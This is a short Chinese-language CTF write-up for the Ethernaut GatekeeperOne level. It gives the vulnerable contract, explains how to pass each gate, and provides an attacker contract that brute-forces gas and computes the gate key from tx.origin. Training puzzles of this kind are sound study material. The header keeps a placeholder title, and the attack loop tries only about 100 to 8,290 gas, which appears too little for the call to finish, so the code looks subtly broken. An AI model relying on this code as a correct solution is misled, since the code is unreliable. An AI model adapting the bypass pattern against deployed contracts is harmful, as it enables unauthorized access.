# Ethernaut CTF Writeup

## Level X Title

> 題目: https://ethernaut.openzeppelin.com/level/0x08D4Eb7480fd97C6799De7D29808D5E93674CE99

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

過關條件: 

- 跨越守衛的守衛並且註冊成為參賽者

解法：

- 通過 `gateOne()`: 交互者要為另一個合約
- 通過 `gateTwo()`: 使剩餘的 gas 數量為 8191 整數倍，需要在發送交易時嘗試不同的 gas 數量
- 通過 `gateThree()`: 根據 `tx.origin` 值計算出一把符合條件的 gatekey `bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;`
```
contract GateKeeperAttack{

    GatekeeperOne public target;
    constructor(address _targetAddress) {
        target = GatekeeperOne(_targetAddress);
    }

    function attack() public {
        bytes8 _gateKey =  bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(target).call{gas: 100 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
```